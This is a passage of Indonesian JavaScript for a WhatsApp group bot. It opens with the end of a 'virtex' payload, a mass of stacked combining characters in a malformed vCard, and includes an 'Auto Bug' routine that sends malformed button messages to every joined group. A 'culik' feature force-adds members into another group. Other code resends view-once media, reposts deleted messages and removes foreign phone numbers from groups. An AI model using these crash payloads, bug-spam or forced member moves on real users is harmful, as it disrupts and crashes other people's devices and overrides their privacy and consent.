̢̗̖͍͉̗̞̣̹̭̪͓͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD"}}}
//=================================================//
const setReply = async (teks) => {
if (db.data.settings[botNumber].replytype == "web1") {
zyren.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], externalAdReply: { showAdAttribution: true, title: "㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "https://youtube.com/c/PakTzy" }}, text: teks }, { quoted: tzy })
} else if (db.data.settings[botNumber].replytype == "web2") {
zyren.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply: { title: "㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "https://youtube.com/c/PakTzy" }}, text: teks }, { quoted: tzy })
} else if (db.data.settings[botNumber].replytype == "web3") {
zyren.sendMessage(m.chat, { contextInfo: { mentionedJid: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [], forwardingScore: 10, isForwarded: true, externalAdReply: { showAdAttribution: true, title: "㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️", body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: logonya, sourceUrl: "https://youtube.com/c/PakTzy" }}, text: teks }, { quoted: tzy })
} else if (db.data.settings[botNumber].replytype == "mess") {
zyren.sendMessage(m.chat, { text: teks, mentions: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [] }, { quoted: tzy })
} else {
zyren.sendMessage(m.chat, { text: teks, mentions: teks? [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") : [] }, { quoted: tzy })
}
}
//=================================================//
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split("@")[0]}:${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail": thumb, thumbnail: thumb,sendEphemeral: true}}}
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "" },"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${ownerName}`, "jpegThumbnail": thumb}}}
const fdoc = {key : {participant : "0@s.whatsapp.net"},message: {documentMessage: {title: `${ownerName}`,jpegThumbnail: thumb}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const floc = {key : {participant : "0@s.whatsapp.net"},message: {locationMessage: {name: `${ownerName}`,jpegThumbnail: thumb}}}
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": ""}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `${ownerName}`, orderTitle: "memek", sellerJid: "0@s.whatsapp.net"}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const cayalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": ""},"message": { "orderMessage": { "itemCount": 0, "surface": "CATALOG" }}}
//=================================================//
try{
var ppuser = await zyren.profilePictureUrl(m.sender, "image")
} catch (err) {
var ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
const ppnyauser = await getBuffer(ppuser)
//=================================================// 
const onlyOwner = async () => {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, gakmau, m)
} else if (db.data.settings[botNumber].autosticker) {
zyren.sendSticker(m.chat, khususowner, m)
} else {
setReply(mess.owner)
}
}
const onlyAdmin = async () => {
if (db.data.settings[botNumber].autovn) {
zyren.sendVn(m.chat, gakmau, m)
} else if (db.data.settings[botNumber].autosticker) {
zyren.sendSticker(m.chat, hanyaadmin, m)
} else {
setReply(mess.admin)
}
}
const onlyBadmin = async () => {
if (db.data.settings[botNumber].autosticker) {
zyren.sendSticker(m.chat, jadiinadmin, m)
} else {
setReply(mess.badmin) 
}
}
const onlyGroup = async () => {
setReply(mess.group)
}
const onlyWait = async () => {
if (db.data.settings[botNumber].autosticker) {
zyren.sendSticker(m.chat, spam1, m)
} else {
setReply(mess.wait)
}
}
//=================================================//
if (!db.data.settings[botNumber].public || m.isGroup && isBanchat && !isAdmins) {
if (!isCreator) return
}
//=================================================//
if (db.data.settings[botNumber].autoread) {
zyren.readMessages([m.key])
}
//=================================================//
if (db.data.settings[botNumber].auto == "recording"){        
await zyren.sendPresenceUpdate("recording", m.chat)
} else if (db.data.settings[botNumber].auto == "typing"){        
await zyren.sendPresenceUpdate("composing", m.chat)
} else if (db.data.settings[botNumber].auto == "available"){        
await zyren.sendPresenceUpdate("available", m.chat)
}
//=================================================//
if ((Input == botNumber && m.isGroup && isAutoResponGroup && !isCmd && !isAudio) || (mentionByReplySticker == botNumber && isSticker && !isCmd)) {
try{
if (isQuotedReplySticker || isReplySticker) {
let liststick = Object.keys(db.data.stickernye)
if (liststick.length !== 0) {
let namastc = await zyren.pickRandom(liststick)
zyren.sendMessage(m.chat, { sticker: { url: db.data.stickernye[namastc].url }}, { quoted: m })
}
} else {
let jawab = ["Afa iyah 🗿", "Oh", "Aku ga ngerti om 🐦", "Boong", "🗿", "🐦", "Oh gitu 🐦"]
let random = zyren.pickRandom(jawab)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${encodeURI(budy)}&lc=id`, { methods: "GET" })
let sami = simi.success
if (sami.startsWith("Aku tidak mengerti")) {
var teksnya = random
} else {
var teksnya = sami
}
await sleep(2000)
zyren.sendMessage(m.chat, { text: teksnya }, { quoted: m })
}
} catch (e) {
console.log(e)
}
}
//=================================================//
for (let x of regex) {
if (m.isGroup && isAutoReact && budy.toLowerCase().includes(x)) {
let emot = await zyren.pickRandom(allemojinya)
zyren.sendMessage(m.chat, { react: { text: emot, key: m.key } })
}
}
//=================================================//
if (m.isGroup && isAntiDelete && m.mtype == "protocolMessage") {
if (db.data.users[m.sender].delete.type == "conversation") {
let teks = `\`\`\`「  ANTI DELETE MESSAGE  」\`\`\`

▸ Name : ${db.data.users[m.sender].name}
▸ User : @${m.sender.split("@")[0]}
▸ Clock : ${time2}
▸ Type : text
`
setTimeout(() => {
zyren.sendMessage(m.chat, { text: db.data.users[m.sender].delete.text }) 
}, 3000)
setTimeout(() => {
setReply(teks) 
}, 1000)
}
}
//=================================================//
if (m.isGroup && isAntiViewOnce && m.mtype == "viewOnceMessage") {
try{
let msg = m.message.viewOnceMessage.message
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await zyren.sendMessage(m.chat, { video: buffer, caption: msg[type].caption })
} else if (/image/.test(type)) {
await zyren.sendMessage(m.chat, { image: buffer, caption: msg[type].caption })
}
} catch (e) {
console.log(e)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLink) {
if (budy.includes("https://")) {
if (isCreator && m.key.fromMe && isAdmins) return
let linkgc = await zyren.groupInviteCode(m.chat)
if (budy.includes(`${linkgc}`)) return 
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK DETECTED 」*\n\nKamu mengirim link maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkGroup) {
if (budy.includes("https://chat.whatsapp.com/")) {
if (isCreator && m.key.fromMe && isAdmins) return
let linkgc = await zyren.groupInviteCode(m.chat)
if (budy.includes(`${linkgc}`)) return 
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK GROUP DETECTED 」*\n\nKamu mengirim link group maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkYtChannel) {
if (budy.includes("https://youtube.com/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK YOUTUBE CHANNEL DETECTED 」*\n\nKamu mengirim link youtube maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkYtVideo) {
if (budy.includes("https://youtu.be/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK YOUTUBE VIDEO DETECTED 」*\n\nKamu mengirim link youtube maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkFacebook) {
if (budy.includes("https://www.facebook.com/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK FACEBOOK DETECTED 」*\n\nKamu mengirim link facebook maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkInstagram) {
if (budy.includes("https://www.instagram.com/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK INSTAGRAM DETECTED 」*\n\nKamu mengirim link instagram maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkTelegram) {
if (budy.includes("https://t.me/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK TELEGRAM DETECTED 」*\n\nKamu mengirim link telegram maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkWhatsapp) {
if (budy.includes("wa.me")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK WHATSAPP DETECTED 」*\n\nKamu mengirim link whatsapp maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkTiktok) {
if (budy.includes("https://www.tiktok.com/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK TIKTOK DETECTED 」*\n\nKamu mengirim link tiktok maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiLinkTwitter) {
if (budy.includes("https://twitter.com/")) {
if (isCreator && m.key.fromMe && isAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply("Izin diterima")
setReply("*「 LINK TWITTER DETECTED 」*\n\nKamu mengirim link twitter maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isCreator) {
} else
await zyren.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiToxic) {
for (let x of bad) {
if (budy.toLowerCase().includes(x)) {
if (isCreator && m.key.fromMe && isAdmins) return
setReply("*「 TOXIC DETECTED 」*\n\nKamu berkata kasar maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiSange) {
for (let x of dosa) {
if (budy.toLowerCase().includes(x)) {
if (isCreator && m.key.fromMe && isAdmins) return
setReply("*「 SANGE DETECTED 」*\n\nKamu sange maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiVirtex && budy.length > 20000) {
if (isCreator && m.key.fromMe && isAdmins) return
setReply("*「 VIRTEX DETECTED 」*\n\nKamu mengirim virtex maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
//=================================================//
if (m.isGroup && isBotAdmins && isAntiTag) {
if (mentionByTag[0]) {
if (isCreator && m.key.fromMe && isAdmins) return
setReply("*「 TAG MEMBERS DETECTED 」*\n\nKamu mengganggu org di group maaf kamu akan di keluarkan dari group")
setTimeout(() => {
zyren.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=================================================//
// Auto Bug Send To All Group
if (db.data.settings[botNumber].autobug.status) {
if (Date.now() >= db.data.settings[botNumber].autobug.expired) {
let getGroups = await zyren.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
db.data.settings[botNumber].autobug = {
status: true, 
expired: Date.now() + toMs(timeBug + "m")
}
for(let x of anu) {
zyren.sendMessage(x, {
text: "", 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000) 
}
}
}

if (m.isGroup && db.data.chats[m.chat].culik.status && [db.data.chats[m.chat].culik.penculik].includes(m.sender) && budy.includes("https://chat.whatsapp.com/")) {
let ano = budy.split("https://chat.whatsapp.com/")[1]
let nana = await zyren.groupAcceptInvite(ano)
const groupMet = await zyren.groupMetadata(nana).catch(e => {})
const parti = await groupMet.participants
const groupAdm = await parti.filter(v => v.admin !== null).map(v => v.id)
if (!groupAdm.includes(botNumber)) return onlyBadmin()
setTimeout(() => {
db.data.chats[m.chat].culik = {
status: false, 
penculik: "", 
member: []
}
}, 1000)
await zyren.groupParticipantsUpdate(nana, db.data.chats[m.chat].culik.member, "add")
setReply("Berhasil Menculik Member") 
}

//AUTO BUG REACTION
for (let i of regex) {
if (m.isGroup && isAutoBugReact && budy.toLowerCase().includes(i)){ 
zyren.sendMessage(m.chat, { react: { text: "", key: m.key } })	
}
}


//AUTO RESPON VIA PC
if (!m.isGroup && !isCmd && !m.key.fromMe && db.data.settings[botNumber].autorespon && !isSticker && !isAudio && !isMedia) {
try{
let randomText = ["Ara Ara Kak","Iy Kak","Ada apa kak","🗿","🐦","Afa iy","Apa","Oh","Ok"]
let simiV2 = zyren.pickRandom(randomText)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${encodeURI(budy)}&lc=id`, { methods: "GET" })
let sami = simi.success
zyren.sendMessage(m.chat, { text: sami }, { quoted: m }) 
} catch {
zyren.sendMessage(m.chat, { text: simiV2 }, { quoted: m })             
}
}
//=================================================//
if (Object.keys(db.data.owner).length > 0) {
let data = Object.keys(db.data.owner)
let button = [{ buttonId: `${prefix}owner`, buttonText: { displayText: "ᴏᴡɴᴇʀ" }, type: "RESPONSE" }]
for (let x of data) {
if (Date.now() >= db.data.owner[x].expired) {
setTimeout(() => {
delete db.data.owner[x]
}, 1000)
zyren.sendButLoc(x, "Your time to be owner has run out, please chat owner", copyright, reSize("./media/gambarnye/thezyren.jpg", 300, 300), button)
}}}
//=================================================//
if (db.data.audionye[budy]) {
zyren.sendMessage(m.chat, { audio: { url: db.data.audionye[budy].url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
//=================================================//
if (db.data.stickernye[budy]) {
zyren.sendMessage(m.chat, { sticker: { url: db.data.stickernye[budy].url }}, { quoted: m })
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString("base64") in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString("base64")]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: zyren.user.id,
quoted: tzy.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zyren.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: "append"
}
zyren.ev.emit("messages.upsert", msg)
}
if (("family100"+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100["family100"+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, "")
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, "") === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(" ")) ? `(beberapa Jawaban Terdapat Spasi)` : ""}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? "Menyerah!" : ""}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? "@" + room.terjawab[index].split("@")[0] : ""}`.trim() : false
}).filter(v => v).join("\n")}
${isSurender ? "" : `Perfect Player`}`.trim()
zyren.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100["family100"+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100["family100"+m.chat]
}
if (tebaklagu.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await zyren.sendButtonText(m.chat, [{ buttonId: "tebak lagu", buttonText: { displayText: "Tebak Lagu" }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete tebaklagu[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (kuismath.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await setReply(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (tebakgambar.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await zyren.sendButtonText(m.chat, [{ buttonId: "tebak gambar", buttonText: { displayText: "Tebak Gambar" }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete tebakgambar[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (tebakkata.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
await zyren.sendButtonText(m.chat, [{ buttonId: "tebak kata", buttonText: { displayText: "Tebak Kata" }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zyren.user.name, m)
delete tebakkata[m.sender.split("@")[0]]
} else setReply("*Jawaban Salah!*")
}
if (caklontong.hasOwnProperty(m.sender.split("@")[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split("@")[0]]
deskripsi = caklontong_desk[m.sender.split("@")[0]]
if (budy.toLowerCase() == jawaban) {
